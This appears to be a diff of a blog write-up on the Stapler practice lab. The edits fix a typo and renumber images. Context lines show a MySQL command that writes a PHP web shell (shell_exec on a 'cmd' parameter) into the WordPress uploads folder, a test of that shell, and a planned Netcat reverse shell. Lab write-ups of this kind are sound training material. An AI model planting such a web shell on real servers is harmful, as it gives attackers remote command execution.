@@ -375,7 +375,7 @@ From here, I decided to try and navigate to **/admin112233/** as it seemed the m
 
 <a href="/images/stapler2.png"><img src="/images/stapler2.png"></a>
 
-Damnit! Okay, we all love to play tricks on people - but this nearly gave me a heart attack... Let's try the **/bloglbog/** page now.
+Damnit! Okay, we all love to play tricks on people - but this nearly gave me a heart attack... Let's try the **/blogblog/** page now.
 
 <a href="/images/stapler3.png"><img src="/images/stapler3.png"></a>
 
@@ -665,7 +665,7 @@ ssl._create_default_https_context = ssl._create_unverified_context
 
 Once it ran successfully - I navigated to **https://192.168.1.13:12380/blogblog/wp-content/uploads/** and was presented with a .jpeg file.
 
-<a href="/images/stapler4.png"><img src="/images/stapler4.png"></a>
+<a href="/images/stapler5.png"><img src="/images/stapler5.png"></a>
 
 All I did was save the file to my desktop, and removed the .jpeg extension. When we open to review the file we can see the following:
 
@@ -800,11 +800,11 @@ mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/ht
 
 Once done, we can navigate to **https://192.168.1.13:12380/blogblog/wp-content/uploads/**, and we should see our shell in there.
 
-<a href="/images/stapler5.png"><img src="/images/stapler5.png"></a>
+<a href="/images/stapler6.png"><img src="/images/stapler6.png"></a>
 
 Once inside the shell, let's check to see if it works by typing in **?cmd=ifconfig** at the end of the url.
 
-<a href="/images/stapler6.png"><img src="/images/stapler6.png"></a>
+<a href="/images/stapler7.png"><img src="/images/stapler7.png"></a>
 
 Perfect! Since we already have a PHP Shell in place, let's go ahead and set up a Netcat listener on our host, on port 443. This will be used for when we create our reverse shell through the PHP Shell.
 
